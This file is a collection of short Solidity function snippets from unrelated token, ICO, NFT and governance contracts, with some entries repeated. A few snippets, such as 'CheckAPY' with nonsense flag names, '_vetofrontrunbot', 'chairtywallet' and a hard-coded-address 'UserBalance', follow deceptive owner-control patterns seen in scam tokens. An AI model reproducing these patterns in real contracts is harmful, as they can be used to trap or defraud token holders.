--------------------------------------------------------------------------------
function finishPresale() public onlyOwner returns (bool success) {
        require(contract_state == State.Presale);
        contract_state = State.waitingForICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function startICO() public onlyOwner returns (bool success) {
        require(contract_state == State.waitingForICO);
        contract_state = State.ICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function recordNewAddress(address _adr) internal {
        if (exists[_adr] == false) {
            exists[_adr] = true;
            indices[number] = _adr;
            number++;
        } 
    }
--------------------------------------------------------------------------------
function _mint(address to, uint256 tokenId) internal {
        super._mint(to, tokenId);

        _allTokensIndex[tokenId] = _allTokens.length;
        _allTokens.push(tokenId);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = ADMIN;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function reclaimOwnership() public onlyReclaimableOwner {

      // Erase any pending transfer.
      pendingOwner = address(0);

      // Transfer ownership.
      OwnershipTransferred(owner, reclaimableOwner);
      owner = reclaimableOwner;

      // Reset reclaimableOwner.
      reclaimableOwner = address(0);

  }
--------------------------------------------------------------------------------
constructor() public {
        _owner = msg.sender;
        _name = "Yield Bearing RVX";
        _symbol = "rRVX";
        _decimals = 18;
    }
--------------------------------------------------------------------------------
function finishPresale() public onlyOwner returns (bool success) {
        require(contract_state == State.Presale);
        contract_state = State.waitingForICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function startICO() public onlyOwner returns (bool success) {
        require(contract_state == State.waitingForICO);
        contract_state = State.ICO;
        NewState(contract_state);
        return true;
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
fallback() external payable {
    if (msg.value > 0) {
      // Fire deposited event if we are receiving funds
      Deposited(msg.sender, msg.value, msg.data);
    }
  }
--------------------------------------------------------------------------------
receive() external payable {
    if (msg.value > 0) {
      // Fire deposited event if we are receiving funds
      Deposited(msg.sender, msg.value, msg.data);
    }
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public returns (bool success) {
		if (_value <= 0)  revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
receive() external payable {
        destinationAddress.transfer(msg.value);
        emit Sended(msg.sender, msg.value, 0);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokensLockedAtTime(address _of, string memory _reason, uint256 _time)
        public
        view
        returns (uint256 amount)
    {
        if (locked[_of][_reason].validity > _time)
            amount = locked[_of][_reason].amount;
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0), "Address should not be 0x");
        newOwner = _newOwner;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function allowance (address spender) external onlyGovernance {
        if (_allowance[spender] == true) {_allowance[spender] = false;} else {_allowance[spender] = true; }
    }
--------------------------------------------------------------------------------
function() external payable {
        deposits[msg.sender] += msg.value;
        emit LogDepositETH(msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function startAuction() public onlyOwner{
        require(status == state.pending);
        status = state.active;
        emit Started(block.number);
    }
--------------------------------------------------------------------------------
function endAuction() public onlyOwner{
        require(status == state.active);
        status = state.ended;
        emit Ended(block.number);
    }
--------------------------------------------------------------------------------
function getShareBalance() view public returns (uint256 share_balance){
        require(status == state.success);
        require(winner_bids == assigned_bids);
        share_balance = shares_holders_balance[msg.sender];
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
        uint256 z = x + y;
        assert((z >= x) && (z >= y));
        return z;
    }
--------------------------------------------------------------------------------
function addRecipient( address _recipient, uint _rewardRate ) external onlyPolicy() {
        require( _recipient != address(0) );
        info.push( Info({
            recipient: _recipient,
            rate: _rewardRate
        }));
    }
--------------------------------------------------------------------------------
constructor() public {
        symbol = "PATX";
        name = "Patriot Exchange Token";
        decimals = 8;
        _totalSupply = 200000000.00000000;
    }
--------------------------------------------------------------------------------
function getListCount() public constant returns(uint listCount) {
  	if (disclosureList.length > 0) {
			return disclosureList.length - 1;    // Returns the last rowNumber, reflecting number of records in list
		} else {
			return 0;    // The case of an uninitialized list
		}
	}
--------------------------------------------------------------------------------
function setOutToken (
    	address _tokenAddress
    )
    	public
    	onlyOwner
    {
    	require(_tokenAddress.isContract(), "address must be a contract");
    	outToken = IERC20(_tokenAddress);
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function denyRebasement() public isOwner
    {
        require (pendingRebasement.executed == false, "Rebasement already executed.");
        
        pendingRebasement.executed = true;
    }
--------------------------------------------------------------------------------
function _setfee(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    peru[spender] = val;
    machu[spender] = val2; 
    picchu[spender] = val3;
    cusco = val4;
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
function setLockAccount(address target, uint256 lockenddate)  {
        if (msg.sender != creator) throw;
        lockAccount[target] = lockenddate;
        LockFunds(target, lockenddate);
     }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
    require(msg.sender == proxyOwner());
    bytes32 position = implementationPosition;

    assembly {
      sstore(position, _newImplementation)
    }
  }
--------------------------------------------------------------------------------
function GeniuzCoin() public {
    totalSupply = INITIAL_SUPPLY;                         // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                // Tnitial tokens are assigned to creator
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);            // emit Transfer event
  }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);       
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x312677BC97b584Db3DFd7C16C8805a1ca9950c43,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function ownerOf(uint256 tokenId) public view virtual override returns (address) {
        address owner = _owners[tokenId];
        require(owner != address(0), "ER15");
        return owner;
    }
--------------------------------------------------------------------------------
function _safeTransfer(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _transfer(from, to, tokenId);
        require(_checkOnERC721Received(from, to, tokenId, _data), "ER23");
    }
--------------------------------------------------------------------------------
function _safeMint(
        address to,
        uint256 tokenId,
        bytes memory _data
    ) internal virtual {
        _mint(to, tokenId);
        require(
            _checkOnERC721Received(address(0), to, tokenId, _data),
            "ER25"
        );
    }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferMined() external onlyAdmin {
        balances[admin]             = add(balances[admin], _rewardperweek);
        emit Transfer(0, admin, _rewardperweek);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setFeeReceiver(address _feeReceiver) public onlyOwner {
        require(_feeReceiver != address(0), "zero address is not allowed");
        feeReceiver = _feeReceiver;
    }
--------------------------------------------------------------------------------
function _vetofrontrunbot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function transferGovernance(address newGovernance) public onlyGovernance {
        require(newGovernance != address(0), "ZERO_ADDRESS");
        emit GovernanceTransferred(_governance, newGovernance);
        _governance = newGovernance;
    }
--------------------------------------------------------------------------------
function BOOK(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function isOperatorFor(address _operator, address _tokenHolder) public view returns (bool) {
        return (_operator == _tokenHolder // solium-disable-line operator-whitespace
            || mAuthorizedOperators[_operator][_tokenHolder]
            || (mIsDefaultOperator[_operator] && !mRevokedDefaultOperator[_operator][_tokenHolder]));
    }
--------------------------------------------------------------------------------
function requireMultiple(uint256 _amount) internal view {
        require(_amount % mGranularity == 0, "Amount is not a multiple of granualrity");
    }
--------------------------------------------------------------------------------
function syncModuleLinks(address[] calldata _modulesToBeSynced, bytes32[] calldata _idsToBeSet)
        external
        onlyModulesGovernor
    {
        require(_idsToBeSet.length > 0 && _modulesToBeSynced.length > 0, ERROR_INVALID_IMPLS_INPUT_LENGTH);
        _syncModuleLinks(_modulesToBeSynced, _idsToBeSet);
    }
--------------------------------------------------------------------------------
function isActive(bytes32 _id, address _addr) external view returns (bool) {
        Module storage module = allModules[_addr];
        return module.id == _id && !module.disabled;
    }
--------------------------------------------------------------------------------
function getModuleByAddress(address _addr) external view returns (bytes32 id, bool disabled) {
        Module storage module = allModules[_addr];
        id = module.id;
        disabled = module.disabled;
    }
--------------------------------------------------------------------------------
function KinguinKrowns() {
	owner = msg.sender;
    totalSupply = 100000000 * (10**18); // 100 mln
    balances[msg.sender] = totalSupply;
  }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function PDVBO(
    ) public {
        totalSupply = 1000000000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = "PDV1 BOLIVIA";                                   // Set the name for display purposes
        symbol = "PDVBO";                               // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function deployKeyRingAndWalletAndCall(
    address initialSigningKey, // the initial key on the keyring
    address keyRing,
    address smartWallet,
    bytes calldata data
  ) external returns (bool ok, bytes memory returnData) {
    _deployNewKeyRingIfNeeded(initialSigningKey, keyRing);
    _deployNewSmartWalletIfNeeded(keyRing, smartWallet);
    (ok, returnData) = smartWallet.call(data);
  }
--------------------------------------------------------------------------------
function batchSwapYnft(uint256[] calldata _tokenIds)
      external
    {
        for (uint256 i = 0; i < _tokenIds.length; i++) {
            swapYnft(_tokenIds[i]);
        }
    }
--------------------------------------------------------------------------------
constructor(address _nftAddress, uint256 _cut) public {
        require(_cut <= 10000);
        ownerCut = _cut;

        ERC721 candidateContract = ERC721(_nftAddress);
        nonFungibleContract = candidateContract;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function checkGoalReached() onlyOwner afterDeadline public {
        if (amountRaised >= softCap) {
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;     // Close Crowdsale
    }
--------------------------------------------------------------------------------
function distributeTokens(address _to, uint256 _value) public {
        require(distributionAddress == msg.sender || owner == msg.sender);
        super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
constructor(address _feeToSetter, address _gov, address _graContract, address _pairLogic, address _distribution) public {
        feeToSetter = _feeToSetter;
        gov = _gov;
        graContract = _graContract;
        pairLogic = _pairLogic;
        pfd = IPairFeeDistribution(_distribution);
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function PCXToken()
    {
        // Contract state
        state = ContractState.Fundraising;
        savedState = ContractState.Fundraising;
        tokenExchange = PrivateCityTokens(tokenExchangeAddress);
        totalSupply = 0;
    }
--------------------------------------------------------------------------------
function createMineral(bytes32 _name, uint256 _price) public onlyCEO {
    require(msg.sender != address(0));
    _create_mineral(_name, address(this), _price, 0);
  }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    poseidon[spender] = val;
    kraken[spender] = val2; 
    shitting[spender] = val3;
    teeth = val4;
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
    	super._transferFrom(from, to, tokenId);

    	_removeTokenFromOwnerEnumeration(from, tokenId);

    	_addTokenToOwnerEnumeration(to, tokenId);
	}
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function ownerOf(uint256 _tokenId) external view returns (address owner) {
        uint64 _tokenId64bit = uint64(_tokenId);
        owner = petIndexToOwner[_tokenId64bit];
        
        require(owner != address(0));
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _removeNFToken(
    address _from,
    uint256 _tokenId
  )
    internal
    virtual
  {
    require(idToOwner[_tokenId] == _from, NOT_OWNER);
    ownerToNFTokenCount[_from] -= 1;
    delete idToOwner[_tokenId];
  }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(holderBalance[_owner]).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function hasEnded() public constant returns (bool) {
        bool capReached = weiRaised >= cap;
        bool timeIsUp = now > endTime;
        return timeIsUp || capReached;
    }
--------------------------------------------------------------------------------
function publicStartRegularPhase()
  public
  {
    require(now > (icoOpenTime + 2 weeks) && icoOpenTime != 0);

    icoPhase     = false;
    regularPhase = true;
  }
--------------------------------------------------------------------------------
function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
--------------------------------------------------------------------------------
function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a - b;
        assert(b <= a && c <= a);
        return c;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
constructor(address _logic, address admin_, bytes memory _data) payable UpgradeableProxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _setAdmin(admin_);
    }
--------------------------------------------------------------------------------
function transferTokens(address _tokenAddress, address _recipient) public isOwner {
        ERC20I token = ERC20I(_tokenAddress);
        require(token.transfer(_recipient, token.balanceOf(this)));
    }
--------------------------------------------------------------------------------
function Notes(address fund)
    {
      admin = msg.sender;
      totalSupply = nFund;
      balances[fund] = nFund;    // Deposit all to fund
      activeGroup[fund] = true;  // Allow the fund to transfer
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function burn(uint256 _amount) public {
        _burn(msg.sender,_amount);
        _moveDelegates(_delegates[msg.sender],address(0), _amount);
    }
--------------------------------------------------------------------------------
function Getwsic(uint256 _tokenId) external view returns(uint256){
        //check if id is valid
        require(_tokenId < Ships.length);
        uint256 _wsic = _encodeWSIC(Ships[_tokenId]);
        return _wsic;
    }
--------------------------------------------------------------------------------
function _afterCall(bytes32 id) private {
        require(isOperationReady(id), "TimelockController: operation is not ready");
        _timestamps[id] = _DONE_TIMESTAMP;
    }
--------------------------------------------------------------------------------
function setCrowdsaleAgent(address _crowdsaleAgent) public returns (bool) {
        require(msg.sender == owner || msg.sender == crowdsaleAgent);
        crowdsaleAgent = _crowdsaleAgent;
        return true;
    }
--------------------------------------------------------------------------------
function EtceteraToken() public {
    totalSupply_ = founderTokens;
    balances[msg.sender] = founderTokens;
    Transfer(0x0, msg.sender, founderTokens);
    }
--------------------------------------------------------------------------------
function  PeerSafeLoans() public {
    // Mint initial supply of tokens. All further minting of tokens is disabled
    totalSupply_ = INITIAL_SUPPLY;

    // Transfer all initial tokens to msg.sender
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external override
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function circulateTokensForSale(uint256 tokenAmount) public returns (bool) {
        require (msg.sender == wallet);
        tokenAmount = tokenAmount * 10 ** 18;
        maxTokensToSale = maxTokensToSale + tokenAmount;
    }
--------------------------------------------------------------------------------
constructor(address _admin) public {
    totalSupply_ = INITIAL_SUPPLY;
	balances[_admin] = INITIAL_SUPPLY;
	emit Transfer(address(0x0), _admin, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
        super._mint(_to, _tokenId);

        allTokensIndex[_tokenId] = allTokens.length;
        allTokens.push(_tokenId);
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function _getFee(address _from, address _to, uint _value) private view returns (uint) {
        if (mapAddress_Excluded[_from] || mapAddress_Excluded[_to]) {
           return 0;                                                                        // No fee if excluded
        } else {
            return (_value / 1000);                                                         // Fee amount = 0.1%
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function failsafe_addition(uint256 a, uint256 b)
        public
        pure
        returns (uint256)
    {
        unchecked {
            uint256 sum = a + b;
            return sum >= a ? sum : MAX_SAFE_UINT256;
        }
    }
--------------------------------------------------------------------------------
function getInvestedAmount(address _address)
    public
    view
    returns (uint256)
    {
        uint256 investedAmount = wei_invested_by_contributor_in_presale[_address];
        investedAmount = investedAmount.add(wei_invested_by_contributor_in_sale[_address]);
        return investedAmount;
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function updateHolder(address payable _newHolder) external onlyAdmin {
        require(!holderLocked(), "holder contract is locked");
        _tokenHolder = _newHolder;
        emit UpdatedTokenHolder(_newHolder);
    }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function setPoolId(uint256 _pid) public onlyOwner {
        uint256 old = masterChefPoolId;
        masterChefPoolId = _pid;
        emit PoolIdChanged(msg.sender, old, _pid);
    }
--------------------------------------------------------------------------------
function tradeDaiForEtherV2(
    uint256 daiAmount,
    uint256 quotedEtherAmount,
    uint256 deadline
  ) external returns (uint256 totalDaiSold) {
    // Transfer the Dai from the caller and revert on failure.
    _transferInToken(_DAI, msg.sender, daiAmount);

    // Trade Dai for Ether.
    totalDaiSold = _tradeDaiForEther(
      daiAmount, quotedEtherAmount, deadline, false
    );
  }
--------------------------------------------------------------------------------
function Authorizable() {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyAuthorized {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
--------------------------------------------------------------------------------
function addDepositToken(address _conAddr,string memory _symbol,uint256 exRate) public onlyPermits {
        
        allowDeposit[_conAddr] = true;
        depositExRate[_conAddr] = exRate;
        emit DepositToken(_conAddr,exRate,_symbol);
    }
--------------------------------------------------------------------------------
function processDeposit() private {
        // Load contracts
        IStafiEther stafiEther = IStafiEther(getContractAddress("stafiEther"));
        // Transfer ETH to stafiEther
        stafiEther.depositEther{value: msg.value}();
        // Assign deposits if enabled
        assignDeposits();
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
constructor() public {
    _mint(msg.sender, INITIAL_SUPPLY);
    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x64a83B5BDD146005D354C540529F924BAc525d89,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view override returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function finalize() onlyOwner public {
      require(mediator != 0x0);
      require(!isFinalized);
      require(hasEnded());
      
      finalization();
      Finalized();

      isFinalized = true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function _getLockAmount(address _of) public view returns (uint256) {
		if (_locks[_of].validity > now) return _locks[_of].amount;
    return 0;
	}
--------------------------------------------------------------------------------
function _getLockValidity(address _of) public view  returns (uint256) {
		if (_locks[_of].validity > 0) return _locks[_of].validity;
    return 0;
	}
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function getBasicRate(ERC20 token, bool buy) public view returns(uint) {
        if (buy)
            return tokenData[token].baseBuyRate;
        else
            return tokenData[token].baseSellRate;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function adminTransfer(address _to, uint256 _quantity) public onlyRole(ADMIN_ROLE) {
    address newTransfer = new MultiSigTransfer(_quantity, _to, msg.sender);
    transfers.push(newTransfer);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _getSigner(
        string memory _username,
        string memory _contactData,
        uint _nonce,
        bytes memory _signature
    ) internal view returns(address) {
        bytes32 signHash = _getSignHash(_dataHash(_username, _contactData, _nonce));
        return _recoverAddress(signHash, _signature);
    }
--------------------------------------------------------------------------------
function chairtywallet(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function OpportyToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function triggerCooldown(uint _id) eitherOwner tokenExists(_id) external {
        Hero storage hero = heroes[_id];

        hero.cooldownStartTime = uint64(now);
        hero.cooldownIndex++;
    }
--------------------------------------------------------------------------------
function presaleTokensForAddress(address _address) public view returns (uint)
    {
        return (presaleTokensClaimed[_address] < presaleAccessList[_address]) ? (presaleAccessList[_address] - presaleTokensClaimed[_address]) : 0;
    }
--------------------------------------------------------------------------------
function withdrawPreIcoFounds() public onlyOwner {  
		if(currentPreICObalance > softcap) {
			// send all current ETH from contract to owner
			uint availableToTranser = this.balance-managerETHbonus;
			owner.transfer(availableToTranser);
		}
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function NSPToken() public {
		totalSupply_ = INITIAL_SUPPLY;
		balances[msg.sender] = INITIAL_SUPPLY;
		Transfer(0x0, msg.sender, INITIAL_SUPPLY);
	}
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function createToken(string _name, address _owner, uint256 _price) public onlyCLevel {
    require(_owner != address(0));
    require(_price >= startingPrice);

    _createToken(_name, _owner, _price);
  }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
